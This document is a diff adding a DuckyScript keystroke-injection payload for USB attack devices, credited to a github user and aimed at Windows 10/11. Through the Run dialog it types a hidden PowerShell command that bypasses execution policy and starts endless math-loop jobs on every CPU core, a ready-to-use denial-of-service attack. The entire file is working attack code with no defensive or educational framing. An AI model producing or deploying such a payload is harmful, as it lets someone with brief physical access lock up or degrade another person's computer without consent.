@@ -1,0 +1,17 @@
+REM ┌────────────────────────────────────────────────────────┐
+REM │ hooker01 | github.com/hooker01                         │
+REM │ Description: Launches infinite CPU load on all cores   │
+REM │ using background PowerShell jobs with math loops.      │
+REM │ Hidden execution, no .ps1 file used, direct injection. │
+REM │ Target: Windows 10/11                                  │
+REM └────────────────────────────────────────────────────────┘
+
+
+DELAY 500
+ESC
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C for($i=0;$i-lt[System.Environment]::ProcessorCount;$i++){Start-Job -ScriptBlock{$r=1;while($true){$r=$r*([math]::PI/[math]::E);$r=[math]::Sqrt($r)+[math]::Pow($r,2)}}|Out-Null};while($true){Start-Sleep -Seconds 1}
+DELAY 300
+ENTER
+
